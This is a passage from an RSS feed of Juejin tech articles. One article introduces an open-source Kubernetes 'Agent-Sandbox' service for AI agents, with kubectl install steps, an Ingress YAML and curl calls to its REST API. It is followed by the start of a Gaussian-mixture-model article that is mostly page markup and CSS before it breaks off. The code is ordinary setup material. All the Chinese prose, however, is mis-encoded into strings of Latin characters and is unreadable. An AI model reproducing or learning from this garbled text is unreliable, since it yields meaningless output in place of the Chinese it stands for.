<p>å› æ­¤ManusæŠŠE2Bå¸¦ç«äº†ï¼ŒE2Bæ˜¯ä¸€ä¸ªéå¸¸å¼ºå¤§çš„Sandboxå·¥å…·ï¼Œå®ƒå¯ä»¥å¸®åŠ©Agentæ‰§è¡Œä»£ç æˆ–å‘½ä»¤ï¼Œä½†æ˜¯E2BåŸºæœ¬ä¸Šæ˜¯ä¸ªå•†ä¸šçš„ï¼Œä¸æ–¹ä¾¿æˆ‘ä»¬ä½¿ç”¨ï¼Œä¹‹å‰æˆ‘ä»¬çš„åŠæ³•æ˜¯éƒ¨ç½²ä¸€ä¸ªPythonçš„æ‰§è¡Œä»£ç çš„æœåŠ¡ï¼Œæˆ–ç€éƒ¨ç½²ä¸€ä¸ªPlaywrightçš„æœåŠ¡ï¼Œå„è‡ªæä¾›MCPæˆ–æ™®é€šAPIï¼Œæ¥æ»¡è¶³éœ€æ±‚ï¼Œä½†æ˜¯é‡åˆ°çš„é—®é¢˜ä¹Ÿæ˜¯æ˜¾è€Œæ˜“è§çš„ï¼Œé‚£å°±æ˜¯æ— æ³•å®ç°å¤šæ¬¡è®¿é—®çš„éš”ç¦»ï¼Œä¾‹å¦‚ä¸€ä¸ªAgentè®¿é—®äº†Aç½‘ç«™ï¼Œå¦ä¸€ä¸ªAgentè®¿é—®äº†Bç½‘ç«™ï¼Œå°±ä¼šç›¸äº’å¹²æ‰°ï¼Œæ€§èƒ½ä¹Ÿæ˜¯é—®é¢˜ï¼Œé™¤éä½ éƒ¨ç½²å¾ˆå¤šå®ä¾‹ï¼Œé‚£ä¹Ÿæµªè´¹ã€‚</p>
<p>è¿™ä¸ªé—®é¢˜ä½ ä»¬æ˜¯æ€ä¹ˆè§£å†³çš„ï¼Ÿ</p>
<h2 data-id="heading-1">2ï¼ŒAgent-Sandbox</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c30c3a67cd6464eb96e15f4f5f44972~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ICB5Zyf6LGG6LGG6LGG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768538885&amp;x-signature=UQvNBHLe5nfincJRw5Dw2ZMV3g0%3D" alt="sbarch.jpg" loading="lazy"/></p>
<p>æ²¡æœ‰é€‰æ‹©ï¼Œåªèƒ½è‡ªå·±æäº†ï¼Œä¸ŠåŠå¹´æˆ‘ä»¬æ‹‰äº†å‡ ä¸ªå…„å¼Ÿï¼ŒæŒ‰ç…§ä»¥ä¸Šçš„ç—›ç‚¹ï¼Œå¼€å‘äº†ä¸€ä¸ªAgent-Sandboxï¼Œæ˜¯çš„ï¼Œåå­—å°±å«<strong>Agent-Sandbox</strong>ï¼Œæ˜¯ä¸æ˜¯å¾ˆæŠ€æœ¯æµï¼Œ</p>
<p>ç›®å‰å·²ç»åœ¨ç”Ÿäº§ç¯å¢ƒä½¿ç”¨äº†ï¼Œæ•ˆæœè¿˜ä¸é”™ï¼Œæ”¯æŒMCPå’ŒREST APIï¼ŒAgentå¯ä»¥åœ¨ä»»ä½•éœ€è¦çš„æ—¶å€™åˆ›å»ºä¸€ä¸ªSandboxï¼Œç„¶åæ‰§è¡Œä»£ç ï¼Œè®¿é—®ç½‘ç«™ç­‰ï¼Œå®Œäº‹å„¿åè‡ªå·±åˆ é™¤Sandboxï¼Œéå¸¸æ–¹ä¾¿ã€‚</p>
<p>ä¸è¿‡æœ€è¿‘ä¹Ÿå‘ç°å¸‚é¢ä¸Šå‡ºç°å¾ˆå¤šå…³äºAgent Sandboxçš„å·¥å…·å’Œè®¨è®ºï¼Œå¼€æºçš„åŒ…æ‹¬<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fkubernetes-sigs%2Fagent-sandbox" target="_blank" title="https://github.com/kubernetes-sigs/agent-sandbox" ref="nofollow noopener noreferrer">kubernetes-sigs/agent-sandbox</a> ã€ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fagent-infra%2Fsandbox" target="_blank" title="https://github.com/agent-infra/sandbox" ref="nofollow noopener noreferrer">AIO Sandbox</a> ç­‰ï¼Œè¯´æ˜å¤§å®¶ä¹Ÿåœ¨è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒAIO Sandboxè¿™ä¸ªæ˜¯ç«å±±çš„ï¼Œåªæä¾›ä¸€ä¸ªé›†æˆåŒ–çš„Sandboxç¯å¢ƒï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªDockerçš„Imageï¼Œé‡Œé¢æœ‰å„ç§å·¥å…·ï¼ŒåŒ…æ‹¬æ‰§è¡Œä»£ç ã€æµè§ˆå™¨ã€æ–‡ä»¶ç³»ç»Ÿç­‰ï¼Œè€Œkubernetes-sigs/agent-sandboxæ˜¯ä¸ªéƒ¨ç½²å·¥å…·ï¼Œå¯ä»¥éƒ¨ç½²å„ç§Sandboxç¯å¢ƒï¼Œä¾‹å¦‚ä»–å°±æ”¯æŒéƒ¨ç½²AIO Sandboxï¼Œå¯ä»¥é€šè¿‡å®ƒæ‹‰èµ·å¾ˆå¤šAIO Sandboxçš„å®ä¾‹ï¼Œä½†åŠŸèƒ½è¿˜æ˜¯å¤ªåŸºç¡€äº†ï¼Œæ— æ³•ç›´æ¥ç»™Agentä½¿ç”¨ï¼Œå®‰è£…ä¹Ÿéº»çƒ¦ï¼Œè¦æ±‚çš„Kubernetesç‰ˆæœ¬æ¯”è¾ƒé«˜ï¼Œç›®å‰å¤§å®¶ç”Ÿäº§ç”¨çš„K8Sçš„ç‰ˆæœ¬éƒ½æ¯”è¾ƒæ»åã€‚</p>
<p>åƒæˆ‘ä»¬è¿™æ ·å¼€æºçš„Sandboxè¿˜æ˜¯æ²¡æœ‰çœ‹åˆ°ï¼Œæˆ‘ä»¬å°±å†³å®šæŠŠæˆ‘ä»¬è¿™ä¸ªå¼€æºç»™å¤§å®¶ï¼Œä¹Ÿè®¸å¤§å®¶è·Ÿæˆ‘ä»¬å¸Œæœ›çš„ä¸€æ ·ï¼Œé‚£å°±å¯ä»¥ç”¨å¾—ä¸Šäº†ã€‚</p>
<h3 data-id="heading-2">å¼€æºåœ°å€ï¼š</h3>
<p><strong>Agent-Sandbox</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fagent-sandbox%2Fagent-sandbox" target="_blank" title="https://github.com/agent-sandbox/agent-sandbox" ref="nofollow noopener noreferrer">github.com/agent-sandbâ€¦</a></p>
<h2 data-id="heading-3">3ï¼ŒAgent-Sandboxæœ‰å“ªäº›ç‰¹ç‚¹ï¼Ÿ</h2>
<p>ç›®å‰å®ç°äº†ä¸»è¦çš„åŠŸèƒ½ï¼ŒåŒ…æ‹¬é€šè¿‡MCPæˆ–REST APIæ¥CRUD Sandboxï¼ŒæŒ‡å®šSandboxçš„Imageç­‰ï¼Œåç»­ä¼šæ”¯æŒæ›´å¤šåœºæ™¯çš„Sandboxè¿è¡Œç¯å¢ƒï¼Œæ”¯æŒå„ç§SDKï¼Œæ¥æ»¡è¶³ç¼–ç¨‹åœºæ™¯çš„Sandboxæ§åˆ¶ï¼Œæ›´å¤šSandboxçš„ç®¡ç†åŠŸèƒ½ï¼ŒåŒ…æ‹¬TTLå›æ”¶ã€æ— è°ƒç”¨å›æ”¶ç­‰ï¼Œä»¥åŠç®¡ç†UIï¼Œå¯ä»¥çœ‹åˆ°åœ¨åˆ›å»ºçš„å…¨éƒ¨Sandboxå’Œç›¸å…³æ“ä½œï¼Œä¹Ÿå¯ä»¥é€šè¿‡è¿™ä¸ªUIæ¥åˆ›å»ºSandboxç­‰ï¼Œæ–¹ä¾¿ä¸æ²»ç†ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc020af4a6c44d3fb9dd606bfcab5a8d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ICB5Zyf6LGG6LGG6LGG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768538885&amp;x-signature=USDr4W9j6BbMduqXS%2Bg3e21k73Q%3D" alt="full-lifecycle-demo.png" loading="lazy"/></p>
<h3 data-id="heading-4">ç‰¹æ€§ï¼š</h3>
<ol>
<li>Aiä½¿ç”¨å‹å¥½ï¼Œå¯ä»¥ç›´æ¥è®©Agentæ§åˆ¶Sandboxçš„å…¨ç”Ÿå‘½å‘¨æœŸï¼Œè€Œä¸ä¸€å®šå¾—æå‰åˆ›å»ºå¥½ï¼Œåœ¨ç»™Agentå»ä½¿ç”¨ï¼ŒAgentæŒ‰éœ€åˆ›å»ºå’Œå›æ”¶ï¼›</li>
<li>ç”Ÿæ€å¼€æ”¾ï¼Œéƒ¨ç½²çš„Sandboxè¿è¡Œç¯å¢ƒå¯ä»¥ä¸ç¤¾åŒºçš„å…¼å®¹ï¼Œåˆ—å¦‚å¯ä»¥ç›´æ¥æ‹‰èµ·å‰é¢æåˆ°çš„AIO Sandboxã€Code Serveræˆ–Playwrightç­‰ï¼Œæ–¹ä¾¿å¤§å®¶åˆ©ç”¨ç°æœ‰çš„èµ„æºï¼Œå½“ç„¶ï¼Œå¯ä»¥è‡ªå®šä¹‰è¿è¡Œç¯å¢ƒï¼›</li>
<li>ä¼ä¸šç”Ÿäº§å¯ç”¨ï¼Œå½“ç„¶ï¼Œè€ƒè™‘å‰é¢æåˆ°çš„ç—›ç‚¹ï¼ŒåŸºäºK8Så¼€å‘ï¼Œæ”¯æŒè§„æ¨¡åŒ–ä½¿ç”¨ï¼Œæ ¹æ®éœ€è¦ï¼Œå¯ä»¥å¤§é‡åˆ›å»ºSandboxï¼Œç›¸äº’ä¹‹é—´éš”ç¦»ä½¿ç”¨ï¼›</li>
<li>è½»é‡åŒ–ï¼Œå°±ä¸€ä¸ªç»„ä»¶ï¼Œæ²¡æœ‰é‡‡ç”¨K8Sçš„CRDæ¥å¼€å‘ï¼Œè¿™ä¸ªåç»­ç”¨æˆ·æŒ‰ç…§å’Œå‡çº§éƒ½æ¯”è¾ƒéº»çƒ¦ï¼Œç”¨æˆ·å¾—æ¥å—ä¸€ç§æ–°çš„èµ„æºç±»å‹ï¼Œæˆ‘ä»¬é‡‡ç”¨RS+Labelçš„æ–¹å¼ï¼Œå°½é‡ä¾èµ–K8Sç°æœ‰çš„ç‰¹æ€§æ¥å¿«é€Ÿå®ç°ã€‚</li>
</ol>
<h2 data-id="heading-5">4ï¼Œå¦‚ä½•ä½¿ç”¨Agent-Sandboxï¼Ÿ</h2>
<p>æ‰€ä»¥æ€ä¹ˆä½¿ç”¨å‘¢ï¼Œè¿‡ç¨‹éå¸¸ç®€å•ï¼Œä¸»è¦åˆ†ä¸¤æ­¥ï¼š</p>
<h3 data-id="heading-6">1ï¼Œéƒ¨ç½²Agent-Sandbox</h3>
<p>è¦æ±‚ <strong>Kubernetes version 1.26</strong> æˆ–ä»¥ä¸Šï¼Œ åœ¨ <code>https://github.com/agent-sandbox/agent-sandbox</code> ä¸‹è½½ <code>install.yaml</code> åï¼Œ</p>
<pre><code class="hljs language-bash" lang="bash">kubectl create namespace agent-sandbox
kubectl apply -nagent-sandbox -f install.yaml
</code></pre>
<p>é‡Œé¢ä¼šå®‰è£…deploymentã€serviceç­‰ï¼Œä¹‹åä½ åº”è¯¥æ˜¯éœ€è¦é…ç½®ä¸€ä¸ªingressï¼Œå¦‚ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">networking.k8s.io/v1</span>
<span class="hljs-attr">kind:</span> <span class="hljs-string">Ingress</span>
<span class="hljs-attr">metadata:</span>
  <span class="hljs-attr">name:</span> <span class="hljs-string">agent-sandbox</span>
  <span class="hljs-attr">namespace:</span> <span class="hljs-string">agent-sandbox</span>
<span class="hljs-attr">spec:</span>
  <span class="hljs-attr">ingressClassName:</span> <span class="hljs-string">ingress-nginx</span>
  <span class="hljs-attr">rules:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">host:</span> <span class="hljs-string">agent-sandbox.your-host.com</span>
      <span class="hljs-attr">http:</span>
        <span class="hljs-attr">paths:</span>
          <span class="hljs-bullet">-</span> <span class="hljs-attr">backend:</span>
              <span class="hljs-attr">service:</span>
                <span class="hljs-attr">name:</span> <span class="hljs-string">agent-sandbox</span>
                <span class="hljs-attr">port:</span>
                  <span class="hljs-attr">number:</span> <span class="hljs-number">80</span>
            <span class="hljs-attr">path:</span> <span class="hljs-string">/(.*)</span>
</code></pre>
<p>ä¸»è¦æ˜¯ <code>host</code> éœ€è¦ä½ ç»™å‡ºï¼Œå…¶ä»–å¯ä»¥ç›´æ¥ä½¿ç”¨ã€‚</p>
<h3 data-id="heading-7">2ï¼Œä½¿ç”¨Agent-Sandbox</h3>
<h4 data-id="heading-8">2.1ï¼Œé€šè¿‡Agent-Sandbox MCP Server</h4>
<p>Agent-Sandbox MCP Server åœ°å€ï¼š <code>http://agent-sandbox.your-host.com/mcp</code> ï¼Œæä¾›äº†Sandboxçš„CURDç­‰Toolsã€‚</p>
<p><strong>æ•ˆæœæµ‹è¯•ï¼š</strong></p>
<p>ä¸€ä¸ªç®€å•çš„Demoï¼ŒAgent å†™ä¸ªæ–æ³¢é‚£å¥‘é¢å‡½æ•°ï¼Œç„¶åé€šè¿‡MCP Serveråˆ›å»ºä¸€ä¸ªSandboxï¼Œæ¥è®¡ç®—ï¼Œæœ€ååˆ é™¤Sandboxã€‚</p>
<p><em>æ˜¯ä¸ªGifåŠ¨ç”»ï¼Œå¦‚æœä¸æ’­æ”¾ï¼Œå¯ä»¥æ–°çª—å£æ‰“å¼€ã€‚</em></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d0369337f8ad474899492beeefa6b76f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ICB5Zyf6LGG6LGG6LGG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768538885&amp;x-signature=zrvxsy7v6KCnWXLdwFE4gP96L5s%3D" alt="gitdemo" loading="lazy"/></p>
<p><em>æ›´å¤šæ¼”ç¤ºè¯·å…³æ³¨ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fagent-sandbox%2Fagent-sandbox" target="_blank" title="https://github.com/agent-sandbox/agent-sandbox" ref="nofollow noopener noreferrer">github.com/agent-sandbâ€¦</a></em></p>
<h4 data-id="heading-9">2.2ï¼Œé€šè¿‡Agent-Sandbox RESTful API</h4>
<p>Agent-Sandboxæä¾›RESTful APIæ¥ç®¡ç†Sandboxï¼Œå…¸å‹çš„å·¥ä½œæµç¨‹åŒ…æ‹¬åˆ›å»ºSandboxã€è®¿é—®Sandboxã€åˆ é™¤Sandboxã€‚</p>
<p><strong>aï¼Œåˆ›å»ºä¸€ä¸ªSandbox</strong></p>
<pre><code class="hljs language-shell" lang="shell">curl --location '/api/v1/sandbox' \
--header 'Content-Type: application/json' \
--data '{"name":"sandbox-01"}'
</code></pre>
<p>é»˜è®¤ä¼šæ‹‰èµ·AIO Sandboxï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ï¼ŒæŒ‡å®šå›½å†…é•œåƒï¼Œ</p>
<pre><code class="hljs language-shell" lang="shell">curl --location '/api/v1/sandbox' \
--header 'Content-Type: application/json' \
--data '{"name":"sandbox-01","image":"enterprise-public-cn-beijing.cr.volces.com/vefaas-public/all-in-one-sandbox:latest"}'
</code></pre>
<p><strong>bï¼Œè®¿é—®Sandbox</strong>
<code>/sandbox/{sandbox_name}</code> é€šè¿‡è¿™ä¸ªåœ°å€å¯ä»¥è®¿é—®Sandbox,</p>
<p>ä¾‹å¦‚åˆšæ‰åˆ›å»ºçš„ <strong>sandbox-01</strong> è®¿é—®åœ°å€æ˜¯ï¼š <code>/sandbox/sandbox-01</code>.</p>
<p>è®¿é—®åä½ åº”è¯¥ä¼šçœ‹åˆ°ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2f5d9a6f1af04639a140680313eaa343~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ICB5Zyf6LGG6LGG6LGG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768538885&amp;x-signature=0gDO6%2BCsBd4thSdWT3eMy7kXick%3D" alt="aio-demo.jpg" loading="lazy"/></p>
<p>è®¿é—®è¿™ä¸ªSandboxçš„MCPåœ°å€æ˜¯ï¼š <code>http://agent-sandbox.your-host.com/sandbox/sandbox-01/mcp</code> ï¼Œè¿™ç§åœºæ™¯æ˜¯å…ˆåˆ›å»ºå¥½Sandboxï¼Œç„¶åè®©Agentå»è®¿é—®è¿™ä¸ªSandboxã€‚</p>
<p><strong>cï¼Œåˆ é™¤Sandbox</strong></p>
<p>åˆ é™¤APIï¼š <code>/api/v1/sandbox/{sandbox_name}</code> . ä¾‹å¦‚åˆ é™¤Sandbox <code>sandbox-01</code> :
<strong>Shell</strong></p>
<pre><code class="hljs language-shell" lang="shell">curl --location --request DELETE '/api/v1/sandbox/sandbox-01'
</code></pre>
<p><strong>ç»“æœ:</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"code"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Sandbox sandbox-01 deleted successfully"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h2 data-id="heading-10">ç»“å°¾</h2>
<p>ä»¥ä¸Šå°±æ˜¯Agent-Sandboxçš„ç®€å•ä»‹ç»å’Œä½¿ç”¨æ–¹æ³•ï¼Œæ›´å¤šå†…å®¹è¯·å…³æ³¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fagent-sandbox%2Fagent-sandbox" target="_blank" title="https://github.com/agent-sandbox/agent-sandbox" ref="nofollow noopener noreferrer">Agent-Sandbox</a>é¡¹ç›®ï¼Œåç»­æˆ‘ä»¬ä¼šæŒç»­æ›´æ–°æ›´å¤šåŠŸèƒ½å’Œç‰¹æ€§ï¼ŒåŒ…æ‹¬æåˆ°çš„æ”¯æŒæ›´å¤šåœºæ™¯çš„Sandboxè¿è¡Œç¯å¢ƒï¼Œæ”¯æŒå„ç§SDKæ¥æ»¡è¶³ç¼–ç¨‹åœºæ™¯çš„Sandboxæ§åˆ¶ï¼Œæ›´å¤šSandboxçš„ç®¡ç†åŠŸèƒ½ï¼ŒåŒ…æ‹¬TTLå›æ”¶ã€æ— è°ƒç”¨å›æ”¶ï¼Œå¹¶å‘å¼¹æ€§ä¼¸ç¼©ç­‰ï¼Œä»¥åŠç®¡ç†UIï¼Œå¯ä»¥çœ‹åˆ°å’Œç®¡ç†åˆ›å»ºçš„å…¨éƒ¨Sandboxï¼Œä¹Ÿå¯ä»¥é€šè¿‡è¿™ä¸ªUIæ¥åˆ›å»ºå’Œæ“ä½œSandboxï¼Œä¾‹å¦‚ä¸Šä¼ ä¸‹è½½æ–‡ä»¶ã€æŸ¥çœ‹æ—¥å¿—ã€æ‰§è¡Œå‘½ä»¤ã€æŸ¥çœ‹çŠ¶æ€ç­‰ã€‚</p>
<p>æœ€åæ¬¢è¿å¤§å®¶å…³æ³¨å’ŒPR~ï¼Œæˆ‘ä»¬ä¼šæŒç»­è¿›åŒ–ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ··åˆé«˜æ–¯æ¨¡å‹å…¨è§£æï¼šåŸç†ï¼Œåº”ç”¨ä¸ä»£ç å®ç°]]></title>    <link>https://juejin.cn/post/7592922036092223503</link>    <guid>https://juejin.cn/post/7592922036092223503</guid>    <pubDate>2026-01-09T05:36:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592922036092223503" data-draft-id="7592873628586934272" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ··åˆé«˜æ–¯æ¨¡å‹å…¨è§£æï¼šåŸç†ï¼Œåº”ç”¨ä¸ä»£ç å®ç°"/> <meta itemprop="keywords" content="æœºå™¨å­¦ä¹ "/> <meta itemprop="datePublished" content="2026-01-09T05:36:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Narrastory"/> <meta itemprop="url" content="https://juejin.cn/user/4355593566170010"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ··åˆé«˜æ–¯æ¨¡å‹å…¨è§£æï¼šåŸç†ï¼Œåº”ç”¨ä¸ä»£ç å®ç°
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4355593566170010/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Narrastory
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T05:36:10.000Z" title="Fri Jan 09 2026 05:36:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{line-height:1.75;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;letter-spacing:2px;background-image:linear-gradient(90deg,rgba(50,0,0,.05) 3%,transparent 0),linear-gradient(1turn,rgba(50,0,0,.05) 3%,transparent 0);background-size:20px 20px;background-position:50%;word-break:break-word;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body h1{font-size:23px;margin-bottom:5px;font-weight:700;padding-left:10px;border-left:5px solid #773098}.markdown-body h2{font-size:19px;font-weight:700;padding-left:10px;border-left:5px solid #916dd5}.markdown-body h3{font-size:17px;font-weight:700;padding-left:10px;border-left:5px solid #d89cf6}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;max-width:100%;margin:1em 0;border-radius:6px;box-shadow:2px 4px 7px #999;user-select:none}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{padding:.2em .5em;font-weight:700;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-size:1em;color:#916dd5;word-break:break-word;overflow-x:auto;background-color:none;border-radius:2px}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-weight:400;font-size:.9em;padding:16px 12px;margin:0;color:#333;word-break:normal;overflow-x:auto;background:#f8f8f8;scroll-behavior:smooth}.markdown-body a{text-decoration:none;color:#916dd5;font-weight:700;border-bottom:1px solid #916dd5}.markdown-body a:active,.markdown-body a:hover{color:#773098}.markdown-body table{display:inline-block!important;font-size:14px;width:auto;max-width:100%;overflow:auto;border:1px solid #916dd5;border-collapse:collapse}.markdown-body thead{background-color:#916dd5;color:#fff;text-align:left}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px;border:1px solid #916dd5}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #d89cf6;background-color:#f4eeff}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0;line-height:26px}.markdown-body ol,.markdown-body ul{padding-left:28px;list-style-type:circle}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{color:#916dd5;font-weight:700}.markdown-body b:before,.markdown-body strong:before{content:"ã€Œ"}.markdown-body b:after,.markdown-body strong:after{content:"ã€"}.markdown-body em,.markdown-body i{color:#916dd5}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="ocean">.hljs-comment,.hljs-quote{color:#65737e}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#bf616a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#d08770}.hljs-attribute{color:#ebcb8b}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#a3be8c}.hljs-section,.hljs-title{color:#8fa1b3}.hljs-keyword,.hljs-selector-tag{color:#b48ead}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b303b;color:#c0c5ce}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">æ··åˆé«˜æ–¯æ¨¡å‹å…¨è§£æï¼šåŸç†ï¼Œåº”ç”¨ä¸ä»£ç å®ç°</h2>
<p><code>ming | 2026.01</code></p>
<hr/>
<div align="center">
  <img align="center" src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f9c1ceaf52c9469d9095262eb3561c4a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541770&amp;x-signature=H5QUeYEjP41tusjW8kv1MuJqJ4c%3D" alt="AI Generated Art" width="90%" loading="lazy"/>
</div>
<p>å¦‚æœä½ å¯¹æ··åˆé«˜æ–¯æ¨¡å‹ï¼ˆGMMï¼‰è¿˜ä¸å¤ªäº†è§£ï¼Œä¸çŸ¥é“å®ƒèƒ½åšä»€ä¹ˆï¼Œä¹Ÿå®Œå…¨æ²¡å…³ç³»â€”â€”æœ¬æ–‡æ­£æ˜¯ä¸ºæ­¤è€Œå†™ã€‚ä½ åªéœ€è¦å…·å¤‡æœ€åŸºç¡€çš„é«˜æ–¯åˆ†å¸ƒï¼ˆä¹Ÿç§°æ­£æ€åˆ†å¸ƒï¼‰çŸ¥è¯†å³å¯è½»æ¾è·Ÿä¸Šã€‚</p>
